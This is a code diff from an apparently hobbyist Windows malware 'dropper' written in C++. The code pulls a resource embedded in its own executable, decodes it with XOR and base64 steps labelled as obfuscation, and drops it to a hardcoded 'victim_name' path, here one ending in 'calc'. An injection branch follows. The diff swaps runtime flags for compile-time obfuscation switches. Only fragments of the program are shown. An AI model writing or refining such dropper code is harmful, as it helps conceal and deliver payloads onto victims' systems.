@@ -59,44 +59,6 @@ int main(int argc, char* argv[])
 
 	std::cout << "argc: " << argc << std::endl;
 
-	for (int i = 0; i < argc; i++) {
-		std::cout << argv[i] << std::endl;
-	}
-
-	if (strcmp(argv[1], "--payload") == 0) {
-		victim_name = argv[2];
-	}
-
-	if (strcmp(argv[3], "--base64") == 0 && strcmp(argv[4], "true") == 0) {
-		std::cout << "base 64 was true" << std::endl;
-		use_base64 = true;
-	}
-	else if ((strcmp(argv[3], "--base64") == 0) && (strcmp(argv[4], "false") == 0)) {
-		std::cout << "base 64 was false" << std::endl;
-		use_base64 = false;
-	}
-	else if (strcmp(argv[3], "--base64") != 0) {
-		std::cerr << "Base64 not input" << std::endl;
-		return 1;
-	}
-	else {
-		std::cerr << "The base64 flag only take true or false.";
-		return 1;
-	}
-
-	// bool
-	if (strcmp(argv[5], "--xor-key") == 0 && strcmp(argv[6], "0") == 0) {
-		std::cout << "xor was null";
-		use_xor = false;
-		xor_key = 0;
-	}
-	else {
-		std::cout << "xor was " << argv[6] << std::endl;
-		use_xor = true;
-		xor_key = (int)std::atoi(argv[6]);
-	}
-	// int
-
 	// Handle to myself
 	HMODULE h = GetModuleHandle(NULL);
 	// Locate Resource
@@ -108,14 +70,14 @@ int main(int argc, char* argv[])
 	// Get embedded file size
 	DWORD size = SizeofResource(h, r);
 	// Obfuscation Procedures start here
-	if (use_xor) {
+#if XOR_ENCODE
 		std::cout << "xor was executed.";
 		data = XOR(data, size);
-	}
-	if (use_base64) {
+#endif
+#if BASE64
 		std::cout << "base 64 was executed";
 		data = base64decode(data, &size);
-	}
+#endif
 
 	// where to drop
 	set_name();
@@ -147,6 +109,7 @@ void set_name()
 		}
 	}
 #else
+	victim_name = (char*) "C:\\Users\\adind\\Dropper\\Walmart-version-of-Dropper\\calc";
 	strcpy_s(name, sizeof(name), victim_name);
 #endif
 #ifdef INJECT
